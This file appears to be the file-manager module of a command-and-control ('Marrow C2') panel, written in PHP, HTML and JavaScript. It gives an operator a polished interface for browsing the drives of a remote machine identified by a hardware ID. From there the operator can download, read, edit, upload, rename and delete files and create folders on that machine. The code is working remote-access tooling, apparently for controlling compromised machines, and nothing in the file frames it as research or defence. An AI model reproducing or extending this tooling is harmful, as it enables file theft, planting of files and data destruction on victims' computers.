<?php
// Marrow C2 - File Manager Module
// Professional file browser with animations, full features
?>
<div id="fm-container" class="h-full flex flex-col bg-gradient-to-br from-[#030712] to-[#0a0f1a] relative">
    <!-- Top Toolbar -->
    <div class="h-14 bg-[#0a0f1a]/80 backdrop-blur border-b border-[#1e2433] flex items-center px-4 gap-3">
        <!-- Navigation -->
        <div class="flex items-center gap-1">
            <button onclick="FM.goUp()"
                class="w-9 h-9 bg-gradient-to-b from-[#1a1f2e] to-[#151929] hover:from-[#252b3d] hover:to-[#1a1f2e] border border-[#2a3142] rounded-lg flex items-center justify-center text-base transition-all hover:scale-105 active:scale-95"
                title="Go Up">
                ⬆️
            </button>
            <button onclick="FM.goHome()"
                class="w-9 h-9 bg-gradient-to-b from-[#1a1f2e] to-[#151929] hover:from-[#252b3d] hover:to-[#1a1f2e] border border-[#2a3142] rounded-lg flex items-center justify-center text-base transition-all hover:scale-105 active:scale-95"
                title="Home">
                🏠
            </button>
            <button onclick="FM.refresh()"
                class="w-9 h-9 bg-gradient-to-b from-[#1a1f2e] to-[#151929] hover:from-[#252b3d] hover:to-[#1a1f2e] border border-[#2a3142] rounded-lg flex items-center justify-center text-base transition-all hover:scale-105 active:scale-95"
                title="Refresh">
                🔄
            </button>
        </div>

        <div class="w-px h-7 bg-[#2a3142]"></div>

        <!-- Drives -->
        <div id="fm-drives" class="flex items-center gap-2 overflow-x-auto py-1 scrollbar-hide"></div>

        <div class="flex-1"></div>

        <!-- Path Bar -->
        <div class="flex items-center bg-[#0f1219] border border-[#2a3142] rounded-xl overflow-hidden shadow-inner">
            <span class="px-3 text-gray-500">📂</span>
            <input type="text" id="fm-path" value="C:\"
                class="w-72 bg-transparent py-2.5 pr-4 text-sm font-mono text-white placeholder-gray-600 focus:outline-none"
                placeholder="Enter path..." onkeydown="if(event.key==='Enter'){FM.browse();event.preventDefault();}">
            <button onclick="FM.browse()"
                class="px-4 py-2.5 bg-[#6366f1] hover:bg-[#5558e3] text-white text-sm font-medium transition-colors">
                Go
            </button>
        </div>

        <div class="w-px h-7 bg-[#2a3142]"></div>

        <!-- Actions -->
        <button onclick="FM.downloadSelected()"
            class="px-4 py-2.5 bg-gradient-to-r from-[#10b981] to-[#059669] hover:from-[#0ea573] hover:to-[#047857] text-white rounded-xl text-sm font-medium shadow-lg shadow-emerald-500/20 transition-all hover:scale-105 active:scale-95 flex items-center gap-2">
            📥 Download
        </button>
        <button onclick="document.getElementById('fm-upload-input').click()"
            class="px-4 py-2.5 bg-gradient-to-r from-[#6366f1] to-[#4f46e5] hover:from-[#5558e3] hover:to-[#4338ca] text-white rounded-xl text-sm font-medium shadow-lg shadow-indigo-500/20 transition-all hover:scale-105 active:scale-95 flex items-center gap-2">
            📤 Upload
        </button>
        <input type="file" id="fm-upload-input" multiple class="hidden" onchange="FM.uploadFiles(this.files)">

        <button onclick="FM.newFolder()"
            class="w-9 h-9 bg-gradient-to-b from-[#1a1f2e] to-[#151929] hover:from-[#252b3d] hover:to-[#1a1f2e] border border-[#2a3142] rounded-lg flex items-center justify-center text-base transition-all hover:scale-105"
            title="New Folder">📁</button>
        <button onclick="FM.showNewFile()"
            class="w-9 h-9 bg-gradient-to-b from-[#1a1f2e] to-[#151929] hover:from-[#252b3d] hover:to-[#1a1f2e] border border-[#2a3142] rounded-lg flex items-center justify-center text-base transition-all hover:scale-105"
            title="New File">📄</button>
    </div>

    <!-- Breadcrumb -->
    <div id="fm-breadcrumb"
        class="h-11 bg-[#0a0f1a]/50 border-b border-[#1e2433] flex items-center px-5 gap-1 text-sm overflow-x-auto scrollbar-hide">
        <span class="text-gray-500">Loading...</span>
    </div>

    <!-- File Grid -->
    <div id="fm-grid" class="flex-1 overflow-auto p-5" ondragover="FM.dragOver(event)" ondragleave="FM.dragLeave(event)"
        ondrop="FM.drop(event)">
        <div class="flex items-center justify-center h-full">
            <div class="text-center animate-pulse">
                <div class="text-6xl mb-4">📂</div>
                <p class="text-gray-500">Click <span class="text-[#6366f1]">Go</span> to browse files</p>
            </div>
        </div>
    </div>

    <!-- Status Bar -->
    <div
        class="h-9 bg-[#0a0f1a]/80 backdrop-blur border-t border-[#1e2433] flex items-center justify-between px-5 text-xs">
        <div class="flex items-center gap-4">
            <span id="fm-status" class="text-gray-400">Ready</span>
        </div>
        <div class="flex items-center gap-4">
            <span id="fm-selected" class="text-gray-500"></span>
            <span id="fm-count" class="text-gray-500">0 items</span>
        </div>
    </div>

    <!-- Upload Progress Overlay -->
    <div id="fm-upload-overlay"
        class="hidden absolute inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-40">
        <div class="bg-[#0f1219] border border-[#2a3142] rounded-2xl p-8 shadow-2xl text-center">
            <div class="text-4xl mb-4 animate-bounce">📤</div>
            <div class="text-white font-medium mb-3">Uploading...</div>
            <div class="w-64 h-2 bg-[#1a1f2e] rounded-full overflow-hidden">
                <div id="fm-progress"
                    class="h-full bg-gradient-to-r from-[#6366f1] to-[#a855f7] transition-all duration-300"
                    style="width: 0%"></div>
            </div>
            <div id="fm-progress-text" class="text-xs text-gray-500 mt-2">0%</div>
        </div>
    </div>

    <!-- Drop Zone Overlay -->
    <div id="fm-dropzone"
        class="hidden absolute inset-0 bg-[#10b981]/10 border-4 border-dashed border-[#10b981] flex items-center justify-center z-30 pointer-events-none">
        <div class="text-center">
            <div class="text-6xl mb-4 animate-bounce">📥</div>
            <div class="text-[#10b981] text-xl font-bold">Drop files here</div>
        </div>
    </div>
</div>

<!-- Context Menu -->
<div id="fm-ctx"
    class="fixed bg-[#0f1219]/95 backdrop-blur border border-[#2a3142] rounded-xl shadow-2xl py-2 z-50 min-w-[200px] hidden transform transition-all duration-150 scale-95 opacity-0">
    <div id="fm-ctx-items"></div>
</div>

<!-- Rename Modal -->
<div id="fm-rename-modal"
    class="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 hidden opacity-0 transition-opacity duration-200">
    <div
        class="bg-[#0f1219] border border-[#2a3142] rounded-2xl p-6 w-[400px] transform transition-transform duration-200 scale-95 shadow-2xl">
        <h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2">✏️ Rename</h3>
        <input type="text" id="fm-rename-input"
            class="w-full bg-[#1a1f2e] border border-[#2a3142] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#6366f1] focus:ring-2 focus:ring-[#6366f1]/20 transition-all mb-4">
        <div class="flex gap-3">
            <button onclick="FM.doRename()"
                class="flex-1 py-3 bg-gradient-to-r from-[#6366f1] to-[#4f46e5] hover:from-[#5558e3] hover:to-[#4338ca] text-white rounded-xl font-medium transition-all hover:scale-[1.02] active:scale-[0.98]">Rename</button>
            <button onclick="FM.hideRename()"
                class="flex-1 py-3 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-xl transition-colors">Cancel</button>
        </div>
    </div>
</div>

<!-- New File Modal -->
<div id="fm-newfile-modal"
    class="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 hidden opacity-0 transition-opacity duration-200">
    <div
        class="bg-[#0f1219] border border-[#2a3142] rounded-2xl p-6 w-[500px] transform transition-transform duration-200 scale-95 shadow-2xl">
        <h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2">📄 Create New File</h3>
        <div class="space-y-4">
            <div>
                <label class="text-xs text-gray-500 uppercase tracking-wider mb-2 block">File Name</label>
                <input type="text" id="fm-newfile-name" placeholder="filename.txt"
                    class="w-full bg-[#1a1f2e] border border-[#2a3142] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#6366f1] focus:ring-2 focus:ring-[#6366f1]/20 transition-all">
            </div>
            <div>
                <label class="text-xs text-gray-500 uppercase tracking-wider mb-2 block">Content</label>
                <textarea id="fm-newfile-content" rows="8" placeholder="Enter file content..."
                    class="w-full bg-[#1a1f2e] border border-[#2a3142] rounded-xl px-4 py-3 text-white font-mono text-sm focus:outline-none focus:border-[#6366f1] focus:ring-2 focus:ring-[#6366f1]/20 transition-all resize-none"></textarea>
            </div>
        </div>
        <div class="flex gap-3 mt-5">
            <button onclick="FM.doNewFile()"
                class="flex-1 py-3 bg-gradient-to-r from-[#10b981] to-[#059669] hover:from-[#0ea573] hover:to-[#047857] text-white rounded-xl font-medium transition-all hover:scale-[1.02]">Create
                File</button>
            <button onclick="FM.hideNewFile()"
                class="flex-1 py-3 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-xl transition-colors">Cancel</button>
        </div>
    </div>
</div>

<!-- Edit File Modal -->
<div id="fm-edit-modal"
    class="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 hidden opacity-0 transition-opacity duration-200">
    <div
        class="bg-[#0f1219] border border-[#2a3142] rounded-2xl p-6 w-[700px] max-h-[90vh] flex flex-col transform transition-transform duration-200 scale-95 shadow-2xl">
        <div class="flex items-center justify-between mb-4">
            <h3 class="text-lg font-bold text-white flex items-center gap-2">📝 Edit File</h3>
            <span id="fm-edit-name" class="text-sm text-gray-400 font-mono bg-[#1a1f2e] px-3 py-1 rounded-lg"></span>
        </div>
        <textarea id="fm-edit-content"
            class="flex-1 w-full bg-[#1a1f2e] border border-[#2a3142] rounded-xl px-4 py-3 text-white font-mono text-sm focus:outline-none focus:border-[#6366f1] focus:ring-2 focus:ring-[#6366f1]/20 transition-all resize-none min-h-[400px]"></textarea>
        <div class="flex gap-3 mt-5">
            <button onclick="FM.doSaveEdit()"
                class="flex-1 py-3 bg-gradient-to-r from-[#6366f1] to-[#4f46e5] hover:from-[#5558e3] hover:to-[#4338ca] text-white rounded-xl font-medium transition-all hover:scale-[1.02] flex items-center justify-center gap-2">💾
                Save Changes</button>
            <button onclick="FM.hideEdit()"
                class="flex-1 py-3 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-xl transition-colors">Cancel</button>
        </div>
    </div>
</div>

<style>
    .scrollbar-hide::-webkit-scrollbar {
        display: none;
    }

    .scrollbar-hide {
        -ms-overflow-style: none;
        scrollbar-width: none;
    }

    .fm-item {
        transition: all 0.15s ease;
    }

    .fm-item:hover {
        background: rgba(99, 102, 241, 0.08);
        border-color: rgba(99, 102, 241, 0.3);
    }

    .fm-item.selected {
        background: linear-gradient(135deg, rgba(99, 102, 241, 0.15), rgba(99, 102, 241, 0.05)) !important;
        border-color: #6366f1 !important;
        box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.2);
    }

    .fm-item.selected .fm-icon {
        transform: scale(1.05);
    }

    @keyframes fadeIn {
        from {
            opacity: 0;
            transform: translateY(10px);
        }

        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    .ctx-item {
        padding: 10px 16px;
        cursor: pointer;
        display: flex;
        align-items: center;
        gap: 10px;
        font-size: 13px;
        color: #d1d5db;
        transition: all 0.15s;
    }

    .ctx-item:hover {
        background: linear-gradient(90deg, rgba(99, 102, 241, 0.1), transparent);
        color: white;
    }

    .ctx-item.danger {
        color: #f87171;
    }

    .ctx-item.danger:hover {
        background: linear-gradient(90deg, rgba(248, 113, 113, 0.1), transparent);
    }
</style>

<script>
    const FM = {
        path: 'C:\\',
        files: [],
        selected: null,
        _renameFile: null,
        _editPath: null,
        _downloading: null, // Debounce downloads

        init() {
            this.loadDrives();
            this.browse();

            // Global click to hide context menu
            document.addEventListener('click', (e) => {
                if (!e.target.closest('#fm-ctx')) this.hideContext();
            });

            // Keyboard shortcuts
            document.addEventListener('keydown', (e) => {
                if (e.key === 'F2' && this.selected) { e.preventDefault(); this.showRename(this.selected); }
                if (e.key === 'Delete' && this.selected) { e.preventDefault(); this.delete(this.selected); }
                if (e.key === 'F5') { e.preventDefault(); this.refresh(); }
                if (e.key === 'Escape') { this.hideContext(); this.hideRename(); this.hideNewFile(); this.hideEdit(); }
            });
        },

        loadDrives() {
            queueCommand('drives');
        },

        renderDrives(data) {
            try {
                const drives = JSON.parse(data);
                const container = document.getElementById('fm-drives');
                container.innerHTML = drives.map(d => {
                    const color = d.percent > 90 ? 'from-red-500 to-red-600' : d.percent > 70 ? 'from-yellow-500 to-orange-500' : 'from-emerald-500 to-green-500';
                    return `
                <button onclick="FM.goTo('${d.name}\\\\')" 
                    class="flex items-center gap-2 px-3 py-1.5 bg-gradient-to-b from-[#1a1f2e] to-[#151929] hover:from-[#252b3d] hover:to-[#1a1f2e] border border-[#2a3142] rounded-lg text-xs transition-all hover:scale-105 group">
                    <span class="text-base">💿</span>
                    <span class="font-medium text-gray-300 group-hover:text-white">${d.name}</span>
                    <div class="w-10 h-1.5 bg-[#252b3d] rounded-full overflow-hidden">
                        <div class="h-full bg-gradient-to-r ${color}" style="width:${d.percent}%"></div>
                    </div>
                    <span class="text-gray-500">${d.free}GB</span>
                </button>
            `}).join('');
            } catch (e) { console.error('Drives parse error:', e); }
        },

        browse() {
            this.path = document.getElementById('fm-path').value || 'C:\\';
            this.selected = null;
            this.updateBreadcrumb();

            const grid = document.getElementById('fm-grid');
            grid.innerHTML = `
            <div class="flex items-center justify-center h-full">
                <div class="text-center">
                    <div class="text-5xl mb-4 animate-spin">⏳</div>
                    <p class="text-gray-400">Loading...</p>
                </div>
            </div>`;

            queueCommand('files', this.path);
        },

        updateBreadcrumb() {
            const parts = this.path.split('\\').filter(p => p);
            let html = `<span class="text-gray-400 hover:text-white cursor-pointer transition-colors px-2 py-1 rounded hover:bg-[#1a1f2e]" onclick="FM.goTo('C:\\\\')">💻 Computer</span>`;
            let currentPath = '';

            parts.forEach((p, i) => {
                currentPath += p + '\\';
                html += `<span class="text-gray-600">›</span>`;
                html += `<span class="text-gray-400 hover:text-white cursor-pointer transition-colors px-2 py-1 rounded hover:bg-[#1a1f2e]" onclick="FM.goTo('${currentPath}')">${p}</span>`;
            });

            document.getElementById('fm-breadcrumb').innerHTML = html;
        },

        renderFiles(data) {
            const grid = document.getElementById('fm-grid');

            try {
                this.files = JSON.parse(data);

                if (this.files.error) {
                    grid.innerHTML = `
                    <div class="flex items-center justify-center h-full">
                        <div class="text-center">
                            <div class="text-5xl mb-4">❌</div>
                            <p class="text-red-400 font-medium">Access Denied</p>
                            <p class="text-gray-500 text-sm mt-2">${this.files.error}</p>
                        </div>
                    </div>`;
                    return;
                }

                document.getElementById('fm-count').textContent = `${this.files.length} items`;
                document.getElementById('fm-status').textContent = this.path;
                document.getElementById('fm-selected').textContent = '';

                if (this.files.length === 0) {
                    grid.innerHTML = `
                    <div class="flex items-center justify-center h-full">
                        <div class="text-center">
                            <div class="text-5xl mb-4 opacity-50">📂</div>
                            <p class="text-gray-500">This folder is empty</p>
                        </div>
                    </div>`;
                    return;
                }

                // Sort: folders first, then files
                this.files.sort((a, b) => {
                    if (a.isDir && !b.isDir) return -1;
                    if (!a.isDir && b.isDir) return 1;
                    return a.name.localeCompare(b.name);
                });

                grid.innerHTML = `
                <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 xl:grid-cols-8 gap-3">
                    ${this.files.map((f, i) => `
                        <div class="fm-item bg-[#0f1219] border border-[#1e2433] hover:border-[#2a3142] rounded-xl p-4 text-center cursor-pointer" 
                             style="animation-delay: ${i * 30}ms"
                             data-idx="${i}" 
                             onclick="FM.select(${i})" 
                             ondblclick="FM.open(${i})" 
                             oncontextmenu="FM.showContext(event, ${i})">
                            <div class="fm-icon text-4xl mb-3 transition-transform">${f.isDir ? '📁' : this.getIcon(f.name)}</div>
                            <div class="text-sm text-white truncate font-medium">${this.escapeHtml(f.name)}</div>
                            <div class="text-[11px] text-gray-500 mt-1">${f.isDir ? 'Folder' : this.formatSize(f.size)}</div>
                        </div>
                    `).join('')}
                </div>`;

            } catch (e) {
                grid.innerHTML = `<pre class="text-xs text-gray-400 p-4 bg-[#0f1219] rounded-xl overflow-auto">${data}</pre>`;
            }
        },

        getIcon(name) {
            const ext = (name.split('.').pop() || '').toLowerCase();
            const icons = {
                exe: '⚙️', msi: '⚙️', bat: '📜', cmd: '📜', ps1: '📜', sh: '📜',
                txt: '📝', log: '📝', md: '📝', json: '📋', xml: '📋', yml: '📋', yaml: '📋',
                html: '🌐', htm: '🌐', css: '🎨', js: '📜', ts: '📜', jsx: '📜', tsx: '📜',
                py: '🐍', rb: '💎', go: '🔷', rs: '🦀', java: '☕', c: '🔧', cpp: '🔧', h: '🔧',
                jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️', bmp: '🖼️', svg: '🖼️', webp: '🖼️', ico: '🖼️',
                mp3: '🎵', wav: '🎵', flac: '🎵', ogg: '🎵', m4a: '🎵',
                mp4: '🎬', mkv: '🎬', avi: '🎬', mov: '🎬', wmv: '🎬', webm: '🎬',
                zip: '📦', rar: '📦', '7z': '📦', tar: '📦', gz: '📦',
                pdf: '📕', doc: '📘', docx: '📘', xls: '📗', xlsx: '📗', ppt: '📙', pptx: '📙',
                dll: '🔩', sys: '🔩', ini: '⚙️', cfg: '⚙️', conf: '⚙️',
                lnk: '🔗', url: '🔗'
            };
            return icons[ext] || '📄';
        },

        formatSize(bytes) {
            if (!bytes || bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
        },

        escapeHtml(s) {
            const div = document.createElement('div');
            div.textContent = s || '';
            return div.innerHTML;
        },

        select(idx) {
            document.querySelectorAll('.fm-item').forEach(el => el.classList.remove('selected'));
            const el = document.querySelector(`[data-idx="${idx}"]`);
            if (el) el.classList.add('selected');
            this.selected = this.files[idx];
            document.getElementById('fm-selected').textContent = `Selected: ${this.selected.name}`;
        },

        open(idx) {
            const f = this.files[idx];
            if (f.isDir) {
                this.goTo(this.path.replace(/\\+$/, '') + '\\' + f.name + '\\');
            } else {
                this.download(f.name);
            }
        },

        goTo(path) {
            this.path = path;
            document.getElementById('fm-path').value = path;
            this.browse();
        },

        goUp() {
            let parts = this.path.replace(/\\+$/, '').split('\\');
            if (parts.length > 1) {
                parts.pop();
                this.goTo(parts.join('\\') + '\\');
            }
        },

        goHome() {
            this.goTo('C:\\Users\\');
        },

        refresh() {
            this.browse();
        },

        // Context Menu
        showContext(e, idx) {
            e.preventDefault();
            e.stopPropagation();
            this.select(idx);

            const f = this.files[idx];
            const ctx = document.getElementById('fm-ctx');
            const items = document.getElementById('fm-ctx-items');

            items.innerHTML = `
            <div class="ctx-item" onclick="FM.open(${idx}); FM.hideContext()">
                <span>📂</span> Open
            </div>
            <div class="ctx-item" onclick="FM.download('${this.escapeHtml(f.name)}'); FM.hideContext()">
                <span>📥</span> Download
            </div>
            ${!f.isDir ? `
            <div class="ctx-item" onclick="FM.showEdit(FM.files[${idx}]); FM.hideContext()">
                <span>📝</span> Edit
            </div>` : ''}
            <div style="height:1px;background:#2a3142;margin:6px 0;"></div>
            <div class="ctx-item" onclick="FM.showRename(FM.files[${idx}]); FM.hideContext()">
                <span>✏️</span> Rename
            </div>
            <div class="ctx-item" onclick="FM.copyPath('${this.escapeHtml(f.name)}'); FM.hideContext()">
                <span>📋</span> Copy Path
            </div>
            <div style="height:1px;background:#2a3142;margin:6px 0;"></div>
            <div class="ctx-item danger" onclick="FM.delete(FM.files[${idx}]); FM.hideContext()">
                <span>🗑️</span> Delete
            </div>
        `;

            // Position
            const x = Math.min(e.clientX, window.innerWidth - 220);
            const y = Math.min(e.clientY, window.innerHeight - 300);
            ctx.style.left = x + 'px';
            ctx.style.top = y + 'px';

            ctx.classList.remove('hidden');
            setTimeout(() => {
                ctx.classList.remove('scale-95', 'opacity-0');
                ctx.classList.add('scale-100', 'opacity-100');
            }, 10);
        },

        hideContext() {
            const ctx = document.getElementById('fm-ctx');
            ctx.classList.add('scale-95', 'opacity-0');
            setTimeout(() => ctx.classList.add('hidden'), 150);
        },

        // Operations
        downloadSelected() {
            if (this.selected && !this.selected.isDir) {
                this.download(this.selected.name);
            } else {
                alert(this.selected ? 'Cannot download folders' : 'Select a file first');
            }
        },

        download(name) {
            const fullPath = this.path.replace(/\\+$/, '') + '\\' + name;

            // Debounce: prevent double downloads
            if (this._downloading === fullPath) return;
            this._downloading = fullPath;
            setTimeout(() => { this._downloading = null; }, 2000);

            queueCommand('download', fullPath);
            document.getElementById('fm-status').textContent = '📥 Downloading: ' + name;
        },

        delete(file) {
            if (!confirm(`Delete "${file.name}"?`)) return;
            queueCommand('delete', this.path.replace(/\\+$/, '') + '\\' + file.name);
            document.getElementById('fm-status').textContent = '🗑️ Deleting: ' + file.name;
            setTimeout(() => this.refresh(), 1000);
        },

        copyPath(name) {
            const fullPath = this.path.replace(/\\+$/, '') + '\\' + name;
            navigator.clipboard.writeText(fullPath);
            document.getElementById('fm-status').textContent = '📋 Copied path to clipboard';
        },

        // Rename Modal
        showRename(file) {
            this._renameFile = file;
            document.getElementById('fm-rename-input').value = file.name;
            const modal = document.getElementById('fm-rename-modal');
            modal.classList.remove('hidden');
            setTimeout(() => {
                modal.classList.remove('opacity-0');
                modal.querySelector('div').classList.remove('scale-95');
            }, 10);
            document.getElementById('fm-rename-input').focus();
            document.getElementById('fm-rename-input').select();
        },

        hideRename() {
            const modal = document.getElementById('fm-rename-modal');
            modal.classList.add('opacity-0');
            modal.querySelector('div').classList.add('scale-95');
            setTimeout(() => modal.classList.add('hidden'), 200);
        },

        doRename() {
            const newName = document.getElementById('fm-rename-input').value.trim();
            if (!newName || !this._renameFile) return;

            const oldPath = this.path.replace(/\\+$/, '') + '\\' + this._renameFile.name;
            queueCommand('rename', oldPath + '|' + newName);
            this.hideRename();
            document.getElementById('fm-status').textContent = '✏️ Renaming...';
            setTimeout(() => this.refresh(), 1000);
        },

        // New Folder
        newFolder() {
            const name = prompt('New folder name:');
            if (!name) return;
            queueCommand('mkdir', this.path.replace(/\\+$/, '') + '\\' + name);
            document.getElementById('fm-status').textContent = '📁 Creating folder...';
            setTimeout(() => this.refresh(), 1000);
        },

        // New File Modal
        showNewFile() {
            document.getElementById('fm-newfile-name').value = '';
            document.getElementById('fm-newfile-content').value = '';
            const modal = document.getElementById('fm-newfile-modal');
            modal.classList.remove('hidden');
            setTimeout(() => {
                modal.classList.remove('opacity-0');
                modal.querySelector('div').classList.remove('scale-95');
            }, 10);
            document.getElementById('fm-newfile-name').focus();
        },

        hideNewFile() {
            const modal = document.getElementById('fm-newfile-modal');
            modal.classList.add('opacity-0');
            modal.querySelector('div').classList.add('scale-95');
            setTimeout(() => modal.classList.add('hidden'), 200);
        },

        doNewFile() {
            const name = document.getElementById('fm-newfile-name').value.trim();
            const content = document.getElementById('fm-newfile-content').value;
            if (!name) { alert('Enter a file name'); return; }

            queueCommand('file_write', this.path.replace(/\\+$/, '') + '\\' + name + '|' + content);
            this.hideNewFile();
            document.getElementById('fm-status').textContent = '📄 Creating file...';
            setTimeout(() => this.refresh(), 1000);
        },

        // Edit File Modal
        showEdit(file) {
            this._editPath = this.path.replace(/\\+$/, '') + '\\' + file.name;
            document.getElementById('fm-edit-name').textContent = file.name;
            document.getElementById('fm-edit-content').value = 'Loading...';

            const modal = document.getElementById('fm-edit-modal');
            modal.classList.remove('hidden');
            setTimeout(() => {
                modal.classList.remove('opacity-0');
                modal.querySelector('div').classList.remove('scale-95');
            }, 10);

            queueCommand('file_read', this._editPath);
        },

        hideEdit() {
            const modal = document.getElementById('fm-edit-modal');
            modal.classList.add('opacity-0');
            modal.querySelector('div').classList.add('scale-95');
            setTimeout(() => modal.classList.add('hidden'), 200);
        },

        handleFileRead(data) {
            try {
                const json = JSON.parse(data);
                document.getElementById('fm-edit-content').value = json.content !== undefined ? json.content : (json.error || data);
            } catch (e) {
                document.getElementById('fm-edit-content').value = data;
            }
        },

        doSaveEdit() {
            const content = document.getElementById('fm-edit-content').value;
            queueCommand('file_write', this._editPath + '|' + content);
            this.hideEdit();
            document.getElementById('fm-status').textContent = '💾 Saving...';
        },

        // Drag & Drop
        dragOver(e) {
            e.preventDefault();
            document.getElementById('fm-dropzone').classList.remove('hidden');
        },

        dragLeave(e) {
            if (!e.relatedTarget || !document.getElementById('fm-grid').contains(e.relatedTarget)) {
                document.getElementById('fm-dropzone').classList.add('hidden');
            }
        },

        drop(e) {
            e.preventDefault();
            document.getElementById('fm-dropzone').classList.add('hidden');
            if (e.dataTransfer.files.length > 0) {
                this.uploadFiles(e.dataTransfer.files);
            }
        },

        async uploadFiles(files) {
            const overlay = document.getElementById('fm-upload-overlay');
            const progress = document.getElementById('fm-progress');
            const progressText = document.getElementById('fm-progress-text');

            overlay.classList.remove('hidden');

            for (let i = 0; i < files.length; i++) {
                const pct = Math.round(((i + 1) / files.length) * 100);
                progress.style.width = pct + '%';
                progressText.textContent = `${pct}% - Uploading ${files[i].name}`;

                const fd = new FormData();
                fd.append('action', 'upload');
                fd.append('hwid', typeof HWID !== 'undefined' ? HWID : '');
                fd.append('path', this.path);
                fd.append('file', files[i]);

                try {
                    await fetch('/api/dashboard.php', { method: 'POST', body: fd });
                } catch (e) { console.error(e); }
            }

            overlay.classList.add('hidden');
            progress.style.width = '0%';
            document.getElementById('fm-status').textContent = `✅ Uploaded ${files.length} file(s)`;
            this.refresh();
        }
    };

    // Initialize when module loads
    if (typeof HWID !== 'undefined') {
        FM.init();
    } else {
        // Wait for HWID to be available
        const checkInit = setInterval(() => {
            if (typeof HWID !== 'undefined' && typeof queueCommand !== 'undefined') {
                clearInterval(checkInit);
                FM.init();
            }
        }, 100);
    }
</script>